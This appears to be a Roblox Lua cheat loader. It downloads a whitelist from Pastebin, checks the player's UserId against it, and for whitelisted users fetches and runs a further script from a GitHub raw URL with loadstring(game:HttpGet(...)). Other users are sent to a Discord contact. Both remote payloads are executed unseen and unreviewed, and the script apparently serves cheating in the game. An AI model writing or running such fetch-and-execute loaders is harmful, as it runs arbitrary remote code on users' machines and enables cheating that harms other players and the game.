local whitelistecheck = loadstring(game:HttpGet("https://pastebin.com/raw/rkenjgfw", true))()
if whitelistecheck[game:service('Players').LocalPlayer.UserId] then
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
		Text = "Sup Bro your whitelisted, here ya go"; --The chat message
		Color = Color3.fromRGB(0, 255, 0); --Chat message color, defaults to white
		Font = Enum.Font.SourceSansBold; --Chat message font, defaults to SourceSansBold
		TextSize = 50 --Text size, defaults to 18
	})
	loadstring(game:HttpGet("https://raw.githubusercontent.com/DragonixGaming/Public-OldAUT/main/old%20aut",true))()
else
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
		Text = "You Aint Whitelisted Bro, Message dragonfly#5010 on discord to get whitelisted"; --The chat message
		Color = Color3.fromRGB(179, 0, 0); --Chat message color, defaults to white
		Font = Enum.Font.SourceSansBold; --Chat message font, defaults to SourceSansBold
		TextSize = 35 --Text size, defaults to 18
	})
end
